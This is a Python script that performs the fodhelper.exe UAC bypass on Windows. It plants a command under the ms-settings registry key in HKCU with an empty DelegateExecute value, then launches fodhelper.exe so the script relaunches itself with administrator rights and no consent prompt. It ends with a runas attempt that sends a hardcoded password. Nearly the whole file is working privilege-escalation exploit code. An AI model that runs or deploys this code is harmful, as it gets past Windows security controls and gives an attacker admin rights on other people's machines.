# -*- coding: utf-8 -*-
"""
Created on Mon Jan  8 09:09:51 2018

@author: coordinate
"""
from __future__ import print_function
import os,subprocess
import sys
import ctypes
if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg
CMD= r"C:\Windows\System32\cmd.exe"
FOD_HELPER= r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD  = "python3"
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise

def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise
def execute():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:
            current_dir = __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)
    else:
        #这里添加我们需要管理员权限的代码
        print('[+] The script is running with administrative privileges!')

if __name__ == '__main__':
    execute()
    # subprocess.call(['runas', '/user:Administrator','', 'net start'])
    from pexpect import popen_spawn
    child = popen_spawn.PopenSpawn(r'runas /user:Administrator cmd')
    # print(child.expect("输入 Administrator 的密码:"))
    child.send("password")